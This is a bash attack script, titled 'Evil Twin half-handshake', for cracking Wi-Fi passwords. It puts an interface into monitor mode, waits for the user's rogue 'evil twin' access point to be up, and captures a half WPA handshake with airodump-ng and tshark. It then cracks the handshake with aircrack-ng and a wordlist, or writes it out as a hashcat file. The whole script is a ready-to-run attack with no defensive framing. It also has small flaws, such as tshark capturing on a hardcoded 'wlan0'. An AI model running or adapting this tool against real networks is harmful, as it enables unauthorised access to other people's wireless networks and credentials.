#!/usr/bin/env bash
#  ___     _ _   _____        _      
# | __|_ _(_) | |_   _|_ __ _(_)_ _  
# | _|\ V / | |   | | \ V  V / | ' \ 
# |___|\_/|_|_|   |_|  \_/\_/|_|_||_|
#  _         _  __     _                 _    _         _       
# | |_  __ _| |/ _|___| |_  __ _ _ _  __| |__| |_  __ _| |_____ 
# | ' \/ _` | |  _|___| ' \/ _` | ' \/ _` (_-< ' \/ _` | / / -_)
# |_||_\__,_|_|_|     |_||_\__,_|_||_\__,_/__/_||_\__,_|_\_\___|

USAGE="Usage: $0 [-i <wireless interface>] [-s <SSID>] [-w <wordlist> | -h]"

HASHCAT=false
IFACE=
SSID=
WORDLIST=

while getopts "i:s:w:h" arg; do
    case $arg in
        i) IFACE=$OPTARG ;;
        s) SSID=$OPTARG ;;
        w) WORDLIST=$OPTARG ;;
        h) HASHCAT=true ;;
    esac
done

# If the option is used without argument
if [[ $IFACE = ":" || $SSID = ":" || $WORDLIST = ":" ]]; then
    echo $USAGE
    echo "The -i, -s, and -w options require following arguments"
    exit 1
fi

# Interface and ssid are always required
if ! [[ $IFACE && $SSID ]]; then
    echo $USAGE
    echo "The -i and -s options are required"
    exit 1
fi

# Either wordlist or hashcat option is required
if ! [[ $HASHCAT = true || $WORDLIST ]]; then
    echo $USAGE
    echo "Either wordlist or hashcat option is required"
    exit 1
fi

# Don't use both wordlist and hashcat
if [[ $HASHCAT = true ]]; then
    if [[ $WORDLIST ]]; then
        echo "The -h option makes a hashcat file instead of using aircrack-ng with a wordlist"
        exit 1
    fi
fi

# Prepare interface, set to monitor mode
clear
sudo airmon-ng check kill &> /dev/null
sudo airmon-ng start $IFACE &> /dev/null

TWIN_FOUND=false
while [[ $TWIN_FOUND = false ]]; do
    read -p "Evil Twin deployed? [Enter]"

    # listen to signals on antenna
    sudo airodump-ng $IFACE -w dump --output-format csv -K 1 &> /dev/null &
    
    WAIT=5
    printf "Listening... %u" $WAIT # %3u means unsigned int and pad to 3 chars wide
    while [[ $WAIT -gt 0 ]]; do
        sleep 1
        WAIT=$((WAIT-1))
        printf "\b%u" $WAIT # backspace 3 times to update countdown in-place
    done
    printf "\n"
    stty sane

    # stop listening
    sudo killall airodump-ng

    # identify channel and bssid
    BSSID=$(grep "$SSID" dump-01.csv | awk -F',' '{print $1}')
    CHANNEL=$(grep "$SSID" dump-01.csv | awk -F',' '{print $4}')
    rm -f dump-01.csv

    if [[ "$BSSID" && "$CHANNEL" ]]; then
        TWIN_FOUND=true
    else
        echo "Interface didn't hear $SSID"
    fi
done

HANDSHAKE_DETECTED=false
while [ $HANDSHAKE_DETECTED = false ]; do
    clear
    echo "$SSID is on channel $CHANNEL with BSSID $BSSID"
    read -p "Ready to capture half-handshake. Enter capture length in seconds to begin: " CAPTIME

    sudo airodump-ng $IFACE -c $CHANNEL -K 1 &> /dev/null & # -K 1 means non-interactive mode
    tshark -i wlan0 -w raw.pcapng -a duration:$CAPTIME &> /dev/null &

    printf "Capturing... %3u" $CAPTIME # %3u means unsigned int and pad to 3 chars wide
    while [[ $CAPTIME -gt 0 ]]; do
        sleep 1
        CAPTIME=$((CAPTIME-1))
        printf "\b\b\b%3u" $CAPTIME # backspace 3 times to update countdown in-place
    done
    printf "\n"

    sudo killall airodump-ng

    # filter pcap
    if [[ $WORDLIST ]]; then
        CAPTURE=half-handshake.pcap
        tshark -r raw.pcapng -F pcap -w $CAPTURE "wlan.addr == $BSSID"
        rm -f raw.pcapng
    else
        CAPTURE=raw.pcapng
    fi

    # if no handshake in capture
    if ! [[ $(tshark -r $CAPTURE eapol) ]]; then
        clear
        while true; do
            read -p "No half-handshake detected in capture. Try again? [y/n] " yn
            case $yn in
                [Yy]* ) continue 2 ;;
                [Nn]* ) break 2 ;;
                * ) ;;
            esac
        done
    else
        HANDSHAKE_DETECTED=true
    fi
done

# Unset monitor mode
sudo airmon-ng stop $IFACE &> /dev/null

# Crack with aircrack-ng or convert to hashcat file
if [[ $HANDSHAKE_DETECTED = true ]]; then
        if [[ $WORDLIST ]]; then
            sudo aircrack-ng $CAPTURE -w $WORDLIST
            rm $CAPTURE
        else
            hcxpcapngtool $CAPTURE -o half-handshake.hc22000 &> /dev/null
            rm $CAPTURE

            echo "Half-handshake written to hashcat file half-handshake.hc22000"
        fi
fi
